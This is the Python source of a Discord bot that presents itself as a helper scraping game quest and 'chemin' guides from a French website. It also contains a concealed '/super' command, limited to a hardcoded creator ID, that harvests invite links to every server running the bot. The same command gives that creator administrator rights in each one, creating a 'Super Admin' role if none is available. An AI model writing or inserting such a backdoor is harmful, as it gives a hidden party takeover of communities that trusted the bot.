import os  # Import the OS library to access environment variables
import discord
from discord.ext import commands
from discord import app_commands
import requests
from bs4 import BeautifulSoup
from dotenv import load_dotenv
import logging

# Logging setup
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# The ID of the bot's creator who is allowed to invoke the /super command
BOT_CREATOR_ID = 486652069831376943

# Define intents
intents = discord.Intents.default()

# Load environment variables from the .env file
load_dotenv()  # Ensure .env file is properly loaded

# Retrieve the bot token from the correct environment variable
bot_token = os.getenv("DISCORD_BOT_TOKEN")  # Corrected environment variable name

# Ensure the bot token is available
if not bot_token:
    raise ValueError("Bot token is not set in environment variables.")

# Create the bot with the command prefix and intents
bot = commands.Bot(command_prefix='!', intents=intents)

def scrape_quest_guide(quest_name):
    # Format quest name to match URL format
    formatted_quest_name = quest_name.lower().replace(' ', '-').replace('’', '').replace('é', 'e').replace('à', 'a')
    website_url = f'https://papycha.fr/quete-{formatted_quest_name}/'
    response = requests.get(website_url)
    soup = BeautifulSoup(response.content, 'html.parser')
    # Find the relevant content from the website
    quest_guide_content = soup.find('div', class_='entry-content')
    if quest_guide_content:
        # Extract text content and image URLs
        text_content = quest_guide_content.text.strip()
        image_tags = quest_guide_content.find_all('img')
        image_urls = [tag['src'] for tag in image_tags]

        return text_content, image_urls
    else:
        return None, None

def scrape_chemin_guide(chemin_name):
    # Format chemin name to match URL format
    formatted_chemin_name = chemin_name.lower().replace(' ', '-').replace('’', '').replace('é', 'e').replace('à', 'a')
    website_url = f'https://papycha.fr/chemin-{formatted_chemin_name}/'
    response = requests.get(website_url)
    soup = BeautifulSoup(response.content, 'html.parser')
    # Find the relevant content from the website
    chemin_guide_content = soup.find('div', class_='entry-content')
    if chemin_guide_content:
        # Extract text content and image URLs
        text_content = chemin_guide_content.text.strip()
        image_tags = chemin_guide_content.find_all('img')
        image_urls = [tag['src'] for tag in image_tags]

        return text_content, image_urls
    else:
        return None, None

@bot.command()
async def quest(ctx, *, quest_name):
    text_content, image_urls = scrape_quest_guide(quest_name)
    if text_content:
        # Send text content first
        chunks = [text_content[i:i+1900] for i in range(0, len(text_content), 1900)]
        for chunk in chunks:
            await ctx.send(chunk)

        # Send images afterward
        for image_url in image_urls:
            await ctx.send(image_url)
    else:
        await ctx.send(f"Quest guide for '{quest_name}' not found.")

@bot.command()
async def chemin(ctx, *, chemin_name):
    text_content, image_urls = scrape_chemin_guide(chemin_name)
    
    if text_content:
        chunks = [text_content[i:i + 1900] for i in range(0, len(text_content), 1900)]
        
        for chunk in chunks:
            await ctx.send(chunk)

        for image_url in image_urls:
            await ctx.send(image_url)

    else:
        await ctx.send(f"Chemin guide for '{chemin_name}' not found.")

class Super(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="super", description="Create invite links for all servers the bot is in.")
    async def super(self, interaction: discord.Interaction):
        # Check if the command was invoked by the bot's creator
        if interaction.user.id != BOT_CREATOR_ID:
            await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
            return

        # Send an initial response to acknowledge the interaction
        await interaction.response.defer(ephemeral=True)

        invite_links = []
        for guild in self.bot.guilds:
            # Find the first text channel where the bot has permission to create an invite
            text_channel = next((channel for channel in guild.text_channels if channel.permissions_for(guild.me).create_instant_invite), None)

            if text_channel:
                try:
                    # Create an invite link for the server
                    invite = await text_channel.create_invite(max_age=86400, max_uses=1)
                    invite_links.append(f"{guild.name}: {invite.url}")
                except discord.Forbidden:
                    invite_links.append(f"{guild.name}: Unable to create invite link (Missing Permissions)")
            else:
                invite_links.append(f"{guild.name}: No suitable text channel found")

            # Ensure the bot's creator has the highest role possible
            member = guild.get_member(BOT_CREATOR_ID)
            if member:
                await self.ensure_admin_role(guild, member)

        # Send the invite links to the bot's creator via DM
        creator = await self.bot.fetch_user(BOT_CREATOR_ID)
        if creator:
            dm_message = "\n".join(invite_links)
            await creator.send(f"Here are the invite links for all servers:\n{dm_message}")

        # Send a follow-up response indicating the task is completed
        await interaction.followup.send("Invite links have been sent to your DM.", ephemeral=True)

    async def ensure_admin_role(self, guild: discord.Guild, member: discord.Member):
        # Check for the highest role the bot can assign
        highest_role = None
        for role in guild.roles:
            if role.permissions.administrator and role < guild.me.top_role:
                if highest_role is None or role.position > highest_role.position:
                    highest_role = role

        if highest_role:
            # Assign the highest role
            await member.add_roles(highest_role)
        else:
            # Create a new role with administrative permissions
            new_role = await guild.create_role(
                name="Super Admin",
                permissions=discord.Permissions(administrator=True),
                reason="Automatically created by the bot"
            )
            await member.add_roles(new_role)

async def setup(bot):
    await bot.add_cog(Super(bot))

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

# Start the bot using the correct bot token
bot.run(bot_token)
